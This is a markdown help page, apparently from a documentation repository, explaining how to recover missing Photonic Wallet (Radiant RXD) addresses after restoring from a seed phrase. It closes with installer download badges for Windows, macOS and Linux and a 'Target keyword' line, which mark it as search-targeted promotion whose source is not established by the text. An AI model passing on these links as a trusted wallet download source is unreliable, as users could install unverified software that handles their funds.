<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Recover missing addresses after a restore

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** If only your first address shows funds, let the wallet run a deeper address scan; most missing coins sit on later addresses.

---

## You'll see this if

- Balance is lower than before
- Only one address appears
- Older payments are missing

## Why it happens

Wallets generate many addresses. A shallow scan stops after a run of unused ones and misses funds further along. More background lives in our guide on [radiant (rxd) derivation paths explained](radiant-rxd-derivation-path-explained.md) and on the [full restore walkthrough](https://photonicwallet.org/guides/restore-wallet).

## Fix it step by step

1. Update to Photonic v3.0.4.
2. Restore from the same seed phrase.
3. Open the address list and generate more receive addresses to extend the scan.
4. Leave the wallet open until syncing completes.

## If that didn't work

Compare an old receiving address on a block explorer to confirm the coins still exist on-chain. The [check an RXD transaction](https://photonicwallet.org/guides/check-rxd-transaction) covers related cases, and [Seed phrase not accepted by Photonic](photonic-wallet-seed-phrase-not-accepted.md) may match your situation.

## Prevention

Keep a note of how many addresses you used and which wallet created them.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Are my coins lost?</b></summary>

Almost never. Coins on-chain stay there; the wallet just needs to find the address.

</details>

<details>
<summary><b>Why did my old wallet show more?</b></summary>

It had already discovered those addresses during daily use.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Radiant (RXD) derivation paths explained](radiant-rxd-derivation-path-explained.md) | Photonic Wallet guide |
| [Seed phrase not accepted by Photonic](photonic-wallet-seed-phrase-not-accepted.md) | Photonic Wallet guide |
| [Move Photonic Wallet to a new computer](move-photonic-wallet-to-new-computer.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet restore multiple addresses · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
